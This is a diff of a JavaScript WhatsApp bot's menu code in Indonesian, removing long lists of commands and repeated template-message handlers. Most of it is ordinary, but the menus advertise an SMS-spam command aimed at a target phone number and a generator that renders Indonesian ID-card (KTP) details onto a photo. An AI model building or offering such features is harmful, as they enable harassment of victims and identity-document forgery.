-  ➙ ${prefix}deluxesilver [teks]
-  ➙ ${prefix}minion [teks]
-  ➙ ${prefix}toxic [teks]
-  ➙ ${prefix}bokeh [teks]
-  ➙ ${prefix}natureleaves [teks]
-  ➙ ${prefix}fireworksparkle [teks]
-  ➙ ${prefix}jokerlogo [teks]
-  ➙ ${prefix}icecold [teks]
-  ➙ ${prefix}breakwall [teks]
-  ➙ ${prefix}roadwarningbox3d [teks]
-  ➙ ${prefix}strawberry [teks]
-  ➙ ${prefix}thunder [teks]
-  ➙ ${prefix}horrorblood [teks]
-  ➙ ${prefix}summersand [teks]
-  ➙ ${prefix}cloud [teks]
-  ➙ ${prefix}luxury [teks]
-  ➙ ${prefix}watercolor [teks]
-  ➙ ${prefix}foggywindow [teks]
-  ➙ ${prefix}harrypotter [teks]
-  ➙ ${prefix}impressiveglitch [teks]
-  ➙ ${prefix}magma [teks]
-  ➙ ${prefix}wonderfulgraffiti [teks]
-  
-  
-*✧ Tools & Internet Menu ✧*
-  ➙ ${prefix}tts [teks]
-  ➙ ${prefix}tts2 [KodeBahasa+teks]
-  ➙ ${prefix}translate [teks]
-  ➙ ${prefix}tst2 [KodeBahasa+teks]
-  ➙ ${prefix}resum [teks]
-  ➙ ${prefix}qrcode [teks]
-  ➙ ${prefix}besarkecil [teks]
-  ➙ ${prefix}bahasapurba [teks]
-  ➙ ${prefix}style [teks]
-  ➙ ${prefix}randombahasa [teks]
-  ➙ ${prefix}readqr _Reply Foto QR_
-  ➙ ${prefix}spamsms [nomor target]
-  ➙ ${prefix}ocr _Reply Foto_
-  ➙ ${prefix}cekumur _Reply Foto Wajah_
-  ➙ ${prefix}cekwajah _Reply Foto Wajah_
-  ➙ ${prefix}shortlink [ url ]
-  ➙ ${prefix}ssweb [ url ]
-  ➙ ${prefix}ssweb2 [ url ]
-  ➙ ${prefix}shortlink2 [ url ]
-  ➙ ${prefix}shortlink3 [ url ]
-  ➙ ${prefix}shortlink4 [ url ]
-  ➙ ${prefix}ipinfo [ IP Address ]
-
-*✧ Voice Changer Menu ✧*
-_Reply Audio_
-  ➙ ${prefix}bass
-  ➙ ${prefix}blown
-  ➙ ${prefix}deep
-  ➙ ${prefix}earrape
-  ➙ ${prefix}fast
-  ➙ ${prefix}fat
-  ➙ ${prefix}nightcore
-  ➙ ${prefix}reverse
-  ➙ ${prefix}robot
-  ➙ ${prefix}slow
-  ➙ ${prefix}squirrel
-
-*✧ Anonymous Chat Menu ✧*
-  ➙ ${prefix}start ( Start Chat )
-  ➙ ${prefix}next ( Next user )
-  ➙ ${prefix}stop ( stop Anonymous chat )
-  
-*✧ Email Sementara ✧*
-  ➙ ${prefix}getemail
-  ➙ ${prefix}cekidmail [username token]
-  ➙ ${prefix}cekmail [username id-mail token]
-  
-  
-━━ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢 ━━
-*Owner Number*
-${global.pemilik} (${global.ownernma})
-
-*Media Sosial*
-${global.medsos1}: ${global.medsos1nama}
-${global.medsos2}: ${global.medsos2nama}
-${global.medsos3}: ${global.medsos3nama}
-
-${global.tqto}
-
-_© ${global.botnma}`)
-            const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
-let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-                listMessage :{
-                    title: `Hi ${pushname}`,
-                    description: `Please Choose The Menu\n`,
-                    buttonText: "Menu",
-                    footerText: `_${global.botnma}_\n${tanggal}`,
-                    listType: "SINGLE_SELECT",
-                    sections: [{
-								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
-								"rows": [
-								   {
-										"title": "ABOUT THIS BOT",
-										"rowId": `${prefix}aboutbot`
-									},
-									{
-										"title": "SEWA BOT",
-										"rowId": `${prefix}sewabot`
-									},
-									{
-										"title": "PING",
-										"rowId": `${prefix}ping`
-									},
-									{
-										"title": "Term of Service",
-										"rowId": `${prefix}tosbot`
-									},
-									{
-										"title": "OWNER THIS BOT",
-										"rowId": `${prefix}owner`
-									}
-								]
-							},
-							{
-								"title": "🇬​🇷​🇴​🇺​🇵​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-								   {
-										"title": "[👮‍♂️] Admin Group Menu",
-										"description": "Fitur khusus admin group",
-                                         "rowId": `${prefix}admingroupmenu`
-									},
-									{
-										"title": "[⚙️] Group System Menu",
-										"description": "Sistem & Setting Group-Fitur khusus admin group",
-										"rowId": `${prefix}groupset`
-									},
-									{
-										"title": "[👨‍👩‍👧‍👦] Group Menu",
-										"description": "Fitur untuk semua, di group",
-										"rowId": `${prefix}groupmenu`
-									}
-								]
-							},
-							{
-								"title": "🇧​🇴​🇹​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-									{
-										"title": "[📑] All Menu",
-										"description": "Menampilkan semua fitur bot!",
-										"rowId": `${prefix}allmenu`
-									},
-									{
-										"title": "[ 🗿] Anime & Manga Menu",
-										"description": "Menampilkan menu anime & manga",
-										"rowId": `${prefix}animemenu`
-									},
-									{
-										"title": "[♻️] Convert Menu",
-										"description": "Fitur convert file dan media",
-										"rowId": `${prefix}convertmenu`
-									},
-										{
-											"title": "[🖼] Creator Maker Menu",
-										"description": "Menggabungkan foto dan teks",
-										"rowId": `${prefix}creatormakermenu`
-										},
-										{
-											"title": "[📂] Database & Chat Menu [💬]",
-										"description": "Menu database dan chat bot",
-										"rowId": `${prefix}databasemenu`
-										},
-										{
-											"title": "[📥] Downloader Menu",
-										"description": "Menu download media online",
-										"rowId": `${prefix}downloadmenu`
-										},
-										{
-										"title": "[ℹ️] Game Checker",
-										"description": "Alat pengecek PlayerID Game",
-										"rowId": `${prefix}gamechecker`
-										},
-										{
-											"title": "[🎮] Game Menu",
-										"description": "Game seru dan asik di sela waktu senggang ",
-										"rowId": `${prefix}gamemenu`
-										},
-										{
-											"title": "[📚] Informasi Menu",
-										"description": "Cari informasi apa saja di menu ini",
-										"rowId": `${prefix}infomenu`
-										},
-										{
-										"title": "[﷽] Islami Menu",
-										"description": "Menu Islami | Al-Qur'an, Sholat, Kisah Nabi, dll",
-										"rowId": `${prefix}islammenu`
-										},
-										{
-											"title": "[🌚] Meme Menu",
-										"description": "Random foto meme kocak",
-										"rowId": `${prefix}mememenu`
-										},
-										{
-											"title": "[🌝] Meme Maker Menu",
-										"description": "Editor pembuat meme",
-										"rowId": `${prefix}mememakermenu`
-										},
-										{
-											"title": "[📰] News Berita Menu",
-										"description": "Berita aktual dalam dan luar negeri",
-										"rowId": `${prefix}beritamenu`
-										},
-										{
-										"title": "[🎇] Photo Editor",
-										"description": "Foto editor dan efek foto!",
-										"rowId": `${prefix}photoeditormenu`
-									},
-									{
-										"title": "[💝] Primbon Menu",
-										"description": "Menu primbon lengkap",
-										"rowId": `${prefix}primbonmenu`
-									},
-									{
-										"title": "[📄] Quotes Menu",
-										"description": "Menu quotes dan kata bijak",
-										"rowId": `${prefix}quotesmenu`
-									},
-									{
-										"title": "[📝] Quotes Maker Menu",
-										"description": "Editor foto | Quotes maker",
-										"rowId": `${prefix}quotesmakermenu`
-									},
-										{
-											"title": "[🌌] Random Image",
-										"description": "Random berbagai foto",
-										"rowId": `${prefix}randomimage`
-										},
-										{
-											"title": "[📋] Random Teks",
-										"description": "Random berbagai teks",
-										"rowId": `${prefix}randomteks`
-										},
-										{
-											"title": "[🔎] Search Menu",
-										"description": "Menu pencarian | Cari apa saja dengan menu ini",
-										"rowId": `${prefix}searchmenu`
-										},
-										{
-										"title": "[🏫] Sekolah Menu",
-										"description": "Menu pendukung kebutuhan belajar",
-										"rowId": `${prefix}sekolahmenu`
-										},
-										{
-											"title": "[🏆] Sertifikat Menu ",
-										"description": "Buat berbagai sertifikat mudah dengan nama mu ",
-										"rowId": `${prefix}sertifikatmenu`
-										},
-										{
-											"title": "[🔭] Stalk Menu",
-										"description": "Menampilkan user profil IG, Tiktok, Github, dll",
-										"rowId": `${prefix}stalkmenu`
-										},
-										{
-										"title": "[🫥] Sticker Menu",
-										"description": "Buat dan Edit Sticker WhatsApp sesukamu",
-										"rowId": `${prefix}stickermenu`
-										},
-										{
-											"title": "[🌠] Teks Maker",
-										"description": "Buat teks menjadi foto, dengan pilihan gaya yang banyak",
-										"rowId": `${prefix}teksmaker`
-										},
-										{
-											"title": "[🌐] Tools & Internet Menu",
-										"description": "Alat yang membantu mu, untuk memudahkan dalam dunia internet",
-										"rowId": `${prefix}toolsmenu`
-										},
-										{
-											"title": "[🎵] Voice Changer Menu",
-										"description": "Alat untuk merubah suara",
-										"rowId": `${prefix}voicechanger`
-										}
-								]
-							},
-							{
-								"title": "🇧​🇪​🇹​🇦​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-									{
-										"title": "[💭] Anonymous Chat Menu",
-										"description": "Ngobrol dengan sesama pengguna",
-										"rowId": `${prefix}anonymouschatmenu`
-									},
-									{
-										"title": "[📧] Email Sementara",
-										"description": "Dapatkan Email sementara dan kelola sesuka Kamu",
-										"rowId": `${prefix}emailmenu`
-									}
-								]
-							},
-							{
-								"title": "🇴​🇼​🇳​🇪​🇷​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-									{
-										"title": "[🤴] Owner Menu",
-										"description": "Fitur khusus owner bot",
-										"rowId": `${prefix}ownermenu`
-									}
-								]
-							},
-							{
-								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
-								"rows": [
-								  {
-										"title": "ABOUT DEVELOPERS",
-									
-										"rowId": `${prefix}aboutdev`
-									},
-									{
-										"title": "DONASI",
-									
-										"rowId": `${prefix}donasi`
-									},
-									{
-										"title": "BOT SCRIPT",
-									
-										"rowId": `${prefix}script`
-									},
-									{
-										"title": "THANKS TO",
-									
-										"rowId": `${prefix}tqto`
-									},
-									{
-										"title": "REPORT BUG",
-									
-										"rowId": `${prefix}report`
-									}
-								]
-							}
-						],
-          listType: 1
-                }
-            }), {})
-            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-
-            break
-            case 'admingroupmenu':  {
-            	dia = m.sender
-  	anu = `*✧ Admin Group Menu ✧*
-  
-  ➙ ${prefix}add [nomor]
-  ➙ ${prefix}kick @user
-  ➙ ${prefix}groupset
-  ➙ ${prefix}tagall
-  ➙ ${prefix}hidetag [teks]
-  ➙ ${prefix}setname [teks]
-  ➙ ${prefix}setdesk [teks]
-  ➙ ${prefix}setppgc _Reply image_
-  ➙ ${prefix}promote @user
-  ➙ ${prefix}demote @user
-`
-  let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-          break
-                      case 'groupmenu':  {
-  	anu = `*✧ Group Menu ✧*
-  
-  ➙ ${prefix}hidetag [teks]
-  ➙ ${prefix}grupinfo 
-  ➙ ${prefix}linkgroup
-  ➙ ${prefix}listonline 
-  ➙ ${prefix}vote
-  ➙ ${prefix}couple
-  ➙ ${prefix}pasanganku
-  ➙ ${prefix}add [nomor]
-  ➙ ${prefix}del _Reply pesan bot_ 
-  ➙ ${prefix}chatinfo _Reply pesan bot_ 
-  ➙ ${prefix}quoted _Reply pesan contain reply_ 
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-           break
-          case 'animemenu':  {
-  	anu = `*✧ Anime Manga  Menu ✧*
-  
-  ➙ ${prefix}animesearch [query]
-  ➙ ${prefix}mangasearch [query]
-  ➙ ${prefix}character [query]
-  ➙ ${prefix}kusonimes [query]
-  ➙ ${prefix}storyanime
-  ➙ ${prefix}neonime
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'convertmenu':  {
-  	anu = `*✧ Convert Menu ✧*
-  
-  ➙ ${prefix}sticker _Reply image/video_
-  ➙ ${prefix}toimg _Reply sticker_
-  ➙ ${prefix}tovideo _Reply sticker_
-  ➙ ${prefix}togif _Reply sticker_
-  ➙ ${prefix}toaudio _Reply video_
-  ➙ ${prefix}tomp3 _Reply video_
-  ➙ ${prefix}tovn _Reply video/audio_
-  ➙ ${prefix}tourl _Reply Foto/Video/Dokumen_
-  ➙ ${prefix}imagenobg _Reply Image/foto_
-  ➙ ${prefix}topdf _Reply Foto/dokumen_
-  ➙ ${prefix}emojimix [emoji1+emoji2]
-  ➙ ${prefix}tobinary _Reply pesan teks_
-  ➙ ${prefix}dbinary _Reply pesan kode binary_
-  ➙ ${prefix}tohex [teks]
-  ➙ ${prefix}dhex [kode hex]
-  ➙ ${prefix}tomorse [teks]
-  ➙ ${prefix}dmorse [kode morse]
-  ➙ ${prefix}style [teks]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'creatormakermenu':  {
-  	anu = `*✧ Creator Maker Menu ✧*
-  
-  
-  ➙ ${prefix}gsuggest [teks1+teks2+teks3]
-  
-  ➙ ${prefix}ytkomen [username+comment] _Reply image_
-  
-  ➙ ${prefix}phkomen [username+comment] _Reply image_
-  
-  ➙ ${prefix}yugioh [title+deskripsi+atk+def] _Reply image_
-  
-  ➙ ${prefix}ktp [Nik+Provinsi+Kabupaten+Nama+tempat tanggal lahir+Jenis kelamin+Jalan+Rt/Rw+Desa+Kecamatan+Agama+Status kawin+Pekerjaan+Warga Negara+Berlaku hingga] _Reply image_
- 
-  ➙ ${prefix}amongus [teks]
-  ➙ ${prefix}idulfitri [teks]
-  ➙ ${prefix}ramadhan [teks]
-  ➙ ${prefix}twtrump [teks]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'databasemenu':  {
-  	anu = `*✧ Database & Chat Menu ✧*
-  
-  ➙ ${prefix}delete _Reply message bot_
-  ➙ ${prefix}del _Reply message bot_
-  ➙ ${prefix}afk [alasan]
-  ➙ ${prefix}setcmd [${prefix}command nya] _Reply sticker/image_
-  ➙ ${prefix}listcmd
-  ➙ ${prefix}delcmd _Reply sticker/image key cmd_
-  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
-  ➙ ${prefix}listpc
-  ➙ ${prefix}listgc
-  ➙ ${prefix}addmsg [teks] _Reply message_
-  ➙ ${prefix}getmsg [key msg] 
-  ➙ ${prefix}listmsg
-  ➙ ${prefix}delmsg [key msg]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'downloadmenu':  {
-  	anu = `*✧ Downloader Menu ✧*
-  
-  ➙ ${prefix}play [query]
-  ➙ ${prefix}ytmp4 [url]
-  ➙ ${prefix}ytmp3 [url]
-  ➙ ${prefix}tiktok [url]
-  ➙ ${prefix}tiktokmp3 [url]
-  ➙ ${prefix}igtv [url]
-  ➙ ${prefix}igreels [url]
-  ➙ ${prefix}twittervideo [url]
-  ➙ ${prefix}twitterfoto [url]
-  ➙ ${prefix}getvideo [nomor list yts]
-  ➙ ${prefix}getmusic [nomor list yts]
-  ➙ ${prefix}ringtone [query]
-  ➙ ${prefix}gimage [query]
-  ➙ ${prefix}pinterest [query]
-  ➙ ${prefix}wikimedia [query]
-  ➙ ${prefix}wallpaper [query]
-  ➙ ${prefix}mediafire [url]
-  ➙ ${prefix}sfilemobi [url]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'gamechecker':  {
-  	anu = `*✧ Game Checker ✧*
-  
-  ➙ ${prefix}ffcek [PlayerID]
-  ➙ ${prefix}mlbbcek [PlayerID ServerID]
-  ➙ ${prefix}pubgcek [PlayerID]
-  ➙ ${prefix}dominocek [UserID]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'gamemenu':  {
-  	anu = `*✧ Game Menu ✧*
-  
-  ➙ ${prefix}math
-  ➙ ${prefix}tebak lirik
-  ➙ ${prefix}tebak kata
-  ➙ ${prefix}tebak kalimat
-  ➙ ${prefix}tebak gambar
-  ➙ ${prefix}tebak lagu
-  ➙ ${prefix}tebak lontong
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'infomenu':  {
-  	anu = `*✧ Informasi Menu ✧*
-  
-  ➙ ${prefix}wikipedia [query]
-  ➙ ${prefix}kbbi [query]
-  ➙ ${prefix}cuaca [kota]
-  ➙ ${prefix}barinly [query]
-  ➙ ${prefix}chord [judul lagu]
-  ➙ ${prefix}beasiswa
-  ➙ ${prefix}jadwaltv
-  ➙ ${prefix}jadwalbola
-  ➙ ${prefix}infogempa
-  ➙ ${prefix}corona
-  ➙ ${prefix}coronaindo
-  ➙ ${prefix}jarak [kota1 kota2]
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'islammenu':  {
-  	anu = `*✧ Islami Menu ✧*
-  
-  ➙ ${prefix}listsurah
-  ➙ ${prefix}alquran
-  ➙ ${prefix}alquranmp3
-  ➙ ${prefix}surahmp3
-  ➙ ${prefix}ayatmp3
-  ➙ ${prefix}jadwalsholat [NamaKota]
-  ➙ ${prefix}hadits
-  ➙ ${prefix}niatsholat
-  ➙ ${prefix}quotesislami
-  ➙ ${prefix}asmaulhusna
-  ➙ ${prefix}kisahnabi
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'mememenu':  {
-  	anu = `*✧ Meme Menu ✧*
-  
-  ➙ ${prefix}darkjoke
-  ➙ ${prefix}memeindo
-  ➙ ${prefix}memeglobal
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'mememakermenu':  {
-  	anu = `*✧ Meme Maker Menu ✧*
-  
-  ➙ ${prefix}meme1 [teks]
-  ➙ ${prefix}mem2 [teks1+teks2]
-  ➙ ${prefix}meme3 [teks1+teks2+teks3]
-  ➙ ${prefix}meme4 [teks]
-  ➙ ${prefix}meme5 [teks]
-  ➙ ${prefix}meme6 [teks1+teks2+teks3]
-  ➙ ${prefix}mem7 [teks1+teks2]
-  ➙ ${prefix}meme8 [teks1+teks2+teks3]
-  ➙ ${prefix}kanna [teks]
-  ➙ ${prefix}mind [teks]
-  ➙ ${prefix}ohno [teks]
-  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
-  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'beritamenu':  {
-  	anu = `*✧ News Berita Menu ✧*
-  
-  ➙ ${prefix}hoax
-  ➙ ${prefix}newsinfo
-  ➙ ${prefix}liputan6
-  ➙ ${prefix}republika
-  ➙ ${prefix}kumparan
-  ➙ ${prefix}detiknews
-  ➙ ${prefix}jalantikus
-  ➙ ${prefix}cnnindonesia
-  ➙ ${prefix}cnnnasional
-  ➙ ${prefix}cnninternasional
-  ➙ ${prefix}cnnolahraga
-  ➙ ${prefix}cnnteknologi
-  ➙ ${prefix}cnnhiburan
-  ➙ ${prefix}cnnsocial
-`
-    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
-     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-     templateMessage: {
-         hydratedTemplate: {
-           videoMessage: message.videoMessage,
-           hydratedContentText: anu,
-           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
-                            hydratedButtons: [{
-                                urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
-                                }
-                            }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
-                        }
-                    }
-                }), { userJid: m.chat })
-                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-          case 'photoeditormenu':  {
-  	anu = `*✧ Photo Editor ✧*
-  
-  ➙ ${prefix}wasted _Reply Foto_ 
-  ➙ ${prefix}pencil _Reply Foto_ 
-  ➙ ${prefix}triggered _Reply Foto_
-  ➙ ${prefix}fisheye _Reply Foto_
-  ➙ ${prefix}skullmask _Reply Foto_
-  ➙ ${prefix}cartoon _Reply Foto_
-  ➙ ${prefix}invert _Reply Foto_
-  ➙ ${prefix}pixelate _Reply Foto_
-  ➙ ${prefix}flip _Reply Foto_
-  ➙ ${prefix}grayscale _Reply Foto_
-  ➙ ${prefix}roundimage _Reply Foto_
-  
-  ➙ ${prefix}affect _Reply Foto_
-  ➙ ${prefix}beautiful _Reply Foto_
